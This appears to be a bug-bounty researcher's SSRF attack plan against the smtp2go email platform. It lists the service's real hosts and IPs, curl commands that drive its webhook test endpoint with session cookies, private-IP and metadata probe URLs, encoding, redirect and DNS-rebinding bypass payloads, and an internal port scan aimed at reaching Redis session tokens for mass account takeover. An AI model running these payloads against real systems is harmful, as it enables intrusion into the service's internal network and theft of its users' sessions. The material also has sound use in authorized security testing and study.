# SSRF Candidates — smtp2go

---

## Infrastructure Map (confirmed)

| Host | IP | Location | Purpose |
|------|----|----------|---------|
| `app-us.smtp2go.com` | `143.42.179.218` | NJ, US | Dashboard + test webhook fetch |
| `api.smtp2go.com` | `172.233.132.16` | LA, US | Public API `/v3/webhook/add` |
| `webhooks.smtp2go.com` | `194.195.124.88` | AU | Production webhook delivery |

All Linode/Akamai AS63949. Not AWS, not GCP — cloud metadata SSRF is dead.
Two separate SSRF surfaces on different Linode instances → different internal networks.

---

## What the Official Docs Tell Us

From the official webhook documentation:

1. **HTTP explicitly supported**: *"PROTOCOL can be either HTTP or HTTPS"* — no HTTPS-only filter
2. **USER:PASSWORD@HOST format documented**: `https://USERNAME:PASSWORD@host.yourdomain.com/webhook` — they explicitly support URL auth format, which is also a bypass vector
3. **Zero mention of URL filtering, IP restrictions, or private IP blocking** — if they blocked private IPs, it would appear in the URL format docs
4. **Testing recommendation is external services** (RequestBin, Beeceptor) — no caveat about URL restrictions
5. **10-second timeout** — connection attempts to closed/filtered ports will show as timeout at exactly this mark
6. **API surface is separate** (`POST https://api.smtp2go.com/v3/webhook/add`) — different server, different code path, different internal network

**Implication**: The absence of any URL validation documentation, combined with explicit HTTP support and documented `@` URL format, is strong evidence there is no application-layer IP blocklist. The protection (if any) would be at network level (firewall), not application level.

---

## SSRF vs Normal Webhook Behavior — Key Distinction

**Normal webhook**: smtp2go sends event data TO your URL after an email event.
**SSRF**: you tell smtp2go's server to fetch FROM a URL — server is the HTTP client.

The test button (`testWebhook()`) is the SSRF surface — it triggers an on-demand
server-side fetch with up to 500 chars of the response returned to your browser.

---

## Reading the Test Results UI — Diagnostic Map

When the test button fires, the server returns a result object per event. The JS maps it:

```js
{
  url:           el.url,           // URL the server fetched
  httpStatus:    el.status_code,   // HTTP status from target (200, 301, 404, -1)
  response:      el.response,      // Response body truncated (shown in results)
  responseTitle: el.response.substr(0,500),  // First 500 chars shown in UI
  message:       el.error,         // Error message (shown on failure)
  label:         status !== 200 ? "Failed" : "Success",
}
```

`status_code === -1` is the server's error path — when it cannot get a valid HTTP response.
In this case `el.status` (the Python exception message) is shown as the response text.
**This is your most important diagnostic field.**

### What each response tells you

| What you see in UI | What it means | Action |
|---|---|---|
| `status: 200`, response has content | ✅ Full SSRF — server fetched and returned body | Stop, write report |
| `status: 200`, response blank | Server connected, got empty 200 | Try different path on same host |
| `status: 301/302`, no body | Server fetch, redirect not followed | Test if redirect to internal works |
| `status: 404/403/500` | Server reached host, got HTTP error | SSRF confirmed (connection reached target) |
| `status: -1`, message: "Connection refused" | Server tried, port closed | Wrong port — try others |
| `status: -1`, message: "Read timeout" or "timed out" | Server tried, no response in time | Network block or service unresponsive |
| `status: -1`, message: "Name resolution failed" / "getaddrinfo" | DNS failure | Domain doesn't resolve |
| `status: -1`, message: "Invalid URL" | Python `requests` rejected the URL format | Try different scheme/format |
| `status: -1`, message: "host not allowed" / "private" / "blocked" | **Server-side blocklist** — explicit SSRF protection | Use bypass techniques |
| No result returned at all / JS error | URL rejected before server makes request | Client or early server validation |

---

## Blacklist vs Whitelist — How to Tell the Difference

### Blacklist (most common — block bad, allow rest)
```
You send:  http://your-server.com/test   → 200 OK, content returned  ✅
You send:  http://169.254.169.254/       → "Private IP blocked"       ❌
You send:  http://localhost/             → "Private IP blocked"       ❌
You send:  http://10.0.0.1/             → "Private IP blocked"       ❌
You send:  http://your-server.com:8080/ → 200 OK                     ✅ (port not blocked)
```
**Signal**: External URLs work, internal IPs produce a specific error message.
**Bypass options**: DNS rebinding, redirect chain, IP encoding, IPv6, CNAME to internal.

### Whitelist (stricter — only allow listed patterns)
```
You send:  http://your-server.com/test    → "URL not in allowed list" ❌
You send:  http://example.com/            → "URL not in allowed list" ❌
You send:  https://hooks.example.com/     → 200 OK                    ✅ (pattern match)
```
**Signal**: Everything fails with the same error. Even external legitimate URLs fail.
**Bypass options**: Very limited — need to find an allowed domain you can control.

### No validation (best case)
```
You send:  http://your-server.com/test  → 200, body returned         ✅
You send:  http://169.254.169.254/      → response/timeout           ✅ (tries it)
You send:  http://localhost/            → connection refused / 200    ✅ (tries it)
```
**Signal**: Everything gets attempted. Different errors for different reasons (timeout vs refused vs 200).

### Network-level block (firewall/egress rules)
```
You send:  http://169.254.169.254/      → timeout (no response ever) — firewall drops
You send:  http://127.0.0.1/            → timeout — firewall drops loopback
You send:  http://your-server.com/      → 200 OK                     ✅ (external allowed)
```
**Signal**: Internal targets timeout uniformly. External works. No application-layer error message.
**Bypass options**: None if network-level. Redirect chain won't help — the second hop also times out.

---

## Testing Options — Step by Step

### Phase 1 — Server-side fetch baseline (run first, always)

**Goal**: confirm the fetch is server-side not client-side.

```bash
# Create webhook
CSRF="BKe9uceYV"
SESSION="<your session cookie>"
LOGIN="<your login_id cookie>"

curl -s -X POST "https://app-us.smtp2go.com/api/settings/webhooks/?CSRF_key=$CSRF" \
  -H "Cookie: session=$SESSION; login_id=$LOGIN" \
  -H "X-Requested-With: XMLHttpRequest" \
  --data-urlencode "url=https://YOUR.interactsh.com/ssrf-test" \
  --data "auth_header_type=&ratelimit=10&ratelimit_enabled=false"
# Save the webhook id from response

# Test it
curl -s -X PUT "https://app-us.smtp2go.com/api/settings/webhooks/?CSRF_key=$CSRF" \
  -H "Cookie: session=$SESSION; login_id=$LOGIN" \
  -H "X-Requested-With: XMLHttpRequest" \
  --data "id=<WEBHOOK_ID>&url=https://YOUR.interactsh.com/ssrf-test&auth_header_type=&ratelimit=10&ratelimit_enabled=false"
```

**Read from interactsh**:
- Source IP: if `143.42.x.x` or different Linode IP → server-side confirmed
- User-Agent: `python-requests/2.x` or `python-urllib3/x` → tells you what library
- Method: GET or POST → tells you how the server fetches
- Any extra headers (auth tokens, internal IDs)

If source IP = your own browser IP → client-side fetch (not SSRF). Stop.

---

### Phase 2 — Determine validation type

Run these in order. The error message pattern tells you exactly what defence is in place.

```bash
# Test A — External HTTPS (should work if anything does)
url=https://YOUR.interactsh.com/test-external

# Test B — External HTTP (check if HTTPS-only)
url=http://YOUR.interactsh.com/test-http

# Test C — localhost port 80
url=http://localhost/

# Test D — 127.0.0.1 (same as C but IP literal)
url=http://127.0.0.1/

# Test E — 127.0.0.1 different port
url=http://127.0.0.1:8080/

# Test F — RFC1918
url=http://10.0.0.1/

# Test G — Linode metadata
url=http://169.254.169.254/v1/
```

**Interpret results**:

| A works, C-G timeout uniformly | Network egress firewall — no bypass |
| A works, C-G get "private IP" error | Application blacklist — try bypasses |
| A works, C-G get "Connection refused" | No blocklist — wrong port, server tried |
| Everything fails with same message | Whitelist — need allowed domain |
| Everything works | No validation — escalate immediately |

---

### Phase 3 — Bypass techniques (if blacklist detected)

**Try these if you get "private IP blocked" or similar on 127.0.0.1:**

```bash
# IP encoding — same address, different representation
url=http://2130706433/          # 127.0.0.1 as decimal integer
url=http://0177.0.0.1/          # 127.0.0.1 in octal
url=http://0x7f000001/          # 127.0.0.1 in hex
url=http://127.1/               # shorthand — resolves to 127.0.0.1 in many implementations
url=http://[::1]/               # IPv6 localhost
url=http://[::ffff:127.0.0.1]/  # IPv4-mapped IPv6

# DNS-based — if blocklist checks IP but AFTER DNS resolution
# Set up: your-domain.com A record → 127.0.0.1
url=http://localtest.me/        # public domain that resolves to 127.0.0.1

# Redirect chain — if server follows 301 redirects
# Set up: your server returns 301 Location: http://127.0.0.1:6379/
url=https://YOUR.server/redirect-to-localhost

# URL parsing confusion
url=http://evil.com@127.0.0.1/  # credentials-in-URL — python requests may parse host as 127.0.0.1
url=http://127.0.0.1.evil.com/  # DNS to your server, but blocklist may parse wrong part

# Scheme variation
url=http://localhost/           # → blocked?
url=HTTP://localhost/           # case change
url=http://LOCALHOST/           # hostname case
```

---

### Phase 4 — Internal port scan (if no blocklist)

Run after confirming no blocklist. "Connection refused" = SSRF alive, port closed.
"Content returned" = jackpot.

```bash
# High-value Django/Python stack ports
url=http://127.0.0.1:6379/     # Redis (session cache, task queue)
url=http://127.0.0.1:5432/     # PostgreSQL
url=http://127.0.0.1:8000/     # Gunicorn internal port (common default)
url=http://127.0.0.1:8080/     # Alt HTTP
url=http://127.0.0.1:9200/     # Elasticsearch
url=http://127.0.0.1:27017/    # MongoDB
url=http://127.0.0.1:11211/    # Memcached
url=http://127.0.0.1:4567/     # Internal admin / debug server
url=http://127.0.0.1:5000/     # Flask debug / internal API
```

Redis on port 6379 is the highest-value target for a Django app — session data, task queue,
potentially cached API keys or auth tokens. Even a "connection refused" vs "timeout" response
tells you whether the port is open or filtered.

---

## If Webhook SSRF Is Blocked — Other Surfaces

### Surface 1 — Email API `fileurl` attachment (direct API, different code path)

```json
POST https://api.smtp2go.com/v3/email/send
{
  "api_key": "YOUR_API_KEY",
  "to": ["you@yourdomain.com"],
  "sender": "you@yourdomain.com",
  "subject": "test",
  "text_body": "test",
  "attachments": [{
    "filename": "test.txt",
    "fileblob": "",
    "mimetype": "text/plain",
    "fileurl": "http://127.0.0.1:6379/"
  }]
}
```

This goes through a completely different code path than the webhook test. Different library,
different validation. If webhook SSRF is blocked, this may not be.

### Surface 2 — Domain verification (HTTP method)

When you verify a sender domain via HTTP file, the server fetches a URL on your domain.
Redirect that URL to an internal target:

```python
# Your server at yourdomain.com returns:
HTTP/1.1 301 Moved Permanently
Location: http://127.0.0.1:6379/
```

### Surface 3 — WebhookProcs retry

```bash
# PUT /api/settings/webhooks/processing/ with id param
# This retries a failed webhook delivery to the stored URL
# If a webhook URL was saved pointing to internal target, retry fires new fetch
PUT /api/settings/webhooks/processing/?CSRF_key=<token>
body: {"id": "<webhookproc_id>"}
```

### Surface 4 — CSPT-003 stream_url

`PUT /api/reports/summary/` returns `stream_url` and the client does `window.location.replace(stream_url)`.
If the server constructs `stream_url` from any request input → open redirect minimum,
SSRF if server-side fetch is involved in generating the export.

---

## [SSRF-001] Test Webhook Button — Full-Response SSRF

| Field | Value |
|---|---|
| **Source** | `webhooks.tag` — `tag.testWebhook()` |
| **Endpoint** | `PUT /api/settings/webhooks/` (empty action) |
| **Key param** | `url` — user-supplied, no client-side IP/scheme validation |
| **Response reflection** | `el.response.substr(0,500)` shown in UI |
| **Status_code -1** | Shows Python exception text as error message — use as diagnostic |
| **Server-side fetch** | ⬜ Unconfirmed — run interactsh baseline |
| **Severity if internal** | High — CVSS 7.7 |
| **Test status** | ⬜ Untested |

### Result
_Populate after testing._

---

## CVSS Scoring — Maximum Achievable by Outcome

The final CVSS depends entirely on which internal service responds and what data is readable.

### Tier 1 — External fetch confirmed (interactsh only)
Not a standalone reportable vulnerability. Proof of server-side fetch alone will not be accepted.
**→ No score**

### Tier 2 — Internal service responds, non-sensitive content
Any internal port returns content (error page, banner, anything).

`AV:N/AC:H/PR:L/UI:N/S:C/C:L/I:N/A:N`
**→ 5.3**

### Tier 3 — Internal service responds, infrastructure data readable
Gunicorn on 8000 returns a Django debug page, Elasticsearch returns index names, any HTTP service returns meaningful content.

`AV:N/AC:H/PR:L/UI:N/S:C/C:H/I:N/A:N`
**→ 7.7** — this is the floor for a confirmed internal hit. Reportable immediately.

### Tier 4 — Redis on 6379 responds, session tokens readable → single ATO
Redis banner visible + `KEYS *` or `SCAN` shows session hashes. One token → one account takeover.

`AV:N/AC:H/PR:L/UI:N/S:C/C:H/I:H/A:N`

AC:H justified because Redis on localhost is inferred (not directly confirmed) and a second step is needed to convert session hash to working cookie.
**→ 7.9**

### Tier 5 — Redis on 6379, session tokens readable → mass ATO
Same as Tier 4 but impact is platform-wide — every active session exposed, attacker can invalidate all sessions by deleting keys.

`AV:N/AC:H/PR:L/UI:N/S:C/C:H/I:H/A:H`
**→ 8.5**

### Tier 6 — Redis confirmed, AC:L argued
Redis reliably responds on every test attempt with no special conditions. No attack complexity.

`AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H`
**→ 9.2 Critical**

### Summary table

| Outcome | CVSS | Vector | Requires |
|---------|------|--------|---------|
| External fetch only | N/A | — | interactsh hit from server IP |
| Internal service, any content | 5.3 | AV:N/AC:H/PR:L/UI:N/S:C/C:L/I:N/A:N | Content from 127.0.0.1:x |
| Internal HTTP, infra data | **7.7** | AV:N/AC:H/PR:L/UI:N/S:C/C:H/I:N/A:N | Meaningful internal response |
| Redis → session → single ATO | 7.9 | AV:N/AC:H/PR:L/UI:N/S:C/C:H/I:H/A:N | Redis banner + session key visible |
| Redis → mass ATO | 8.5 | AV:N/AC:H/PR:L/UI:N/S:C/C:H/I:H/A:H | All sessions exposed + deletable |
| Redis → mass ATO, AC:L | **9.2** | AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H | Repeatable Redis read + ATO PoC |

### Reporting strategy

- **Report at 7.7** the moment any internal port returns content — even a Redis error like `-DENIED` proves the server reached Redis. That is immediately reportable.
- **Push to 8.5** by showing a readable session key exists in Redis.
- **Push to 9.2 only** with a working ATO PoC. Do not claim AC:L without it — triage will dispute it and it weakens the report.
- Redis error banner alone (`-ERR` / `-DENIED`) is sufficient for 7.7. You do not need to read a session key to report.

---

## [SSRF-002] Email API `fileurl` Attachment

| Field | Value |
|---|---|
| **Endpoint** | `POST https://api.smtp2go.com/v3/email/send` |
| **Key param** | `attachments[0].fileurl` |
| **Response reflection** | Indirect — attachment content in delivered email |
| **Severity if internal** | High |
| **Test status** | ⬜ Untested |

### Result
_Populate after testing._

---

## [SSRF-003] Domain Verification — HTTP Redirect Chain

| Field | Value |
|---|---|
| **Endpoint** | `/api/settings/verified_senders/?action=verify` |
| **Key param** | Domain name → server fetches verification URL on your domain |
| **Response reflection** | ❌ Pass/fail only |
| **Severity if internal** | Medium |
| **Test status** | ⬜ Untested |

### Result
_Populate after testing._

---

## [SSRF-004] Domain Registrar Lookup — action=registrar (UNDOCUMENTED)

| Field | Value |
|---|---|
| **Source** | Account B session, new CSV 2026-04-16 |
| **Endpoint** | `GET /api/settings/verified_senders/?action=registrar&domain=TARGET` |
| **Key param** | `domain` — arbitrary string, server does WHOIS/registrar lookup |
| **Response reflection** | ✅ Direct — returns `{"registrar":"ONE.COM"}` |
| **Found in /end-points/** | ❌ NOT listed — undocumented endpoint |
| **Severity if internal** | High |
| **Test status** | ⬜ Untested |

### Evidence
```
GET /api/settings/verified_senders/?action=registrar&CSRF_key=VA7x...&domain=wearehackerone.com
→ {"status":"OK","results":{"registrar":"One.com"}}
```

Server performs a real-time lookup (WHOIS/DNS/third-party registrar API) based on `domain` param.

### Test plan
- [ ] `domain=127.0.0.1` — does server make HTTP/DNS request to localhost?
- [ ] `domain=169.254.169.254` — cloud metadata
- [ ] `domain=10.0.0.1` — internal network probe  
- [ ] `domain=your.interactsh.com` — confirm server-side DNS/HTTP, observe source IP
- [ ] `domain=attacker.com.169.254.169.254.nip.io` — DNS rebinding bypass
- [ ] `domain=XXXX.burpcollaborator.net` — blind SSRF detection
- [ ] Check if lookup is DNS or HTTP — compare response times for non-existent domains

### Why high priority
This endpoint is NOT in the public API documentation (`/end-points/`). It takes raw user input and the server makes a network call. No validation of `domain` parameter was evidenced. The response is returned directly to the user, making this a full-read SSRF if exploitable.

### Result
_Populate after testing._
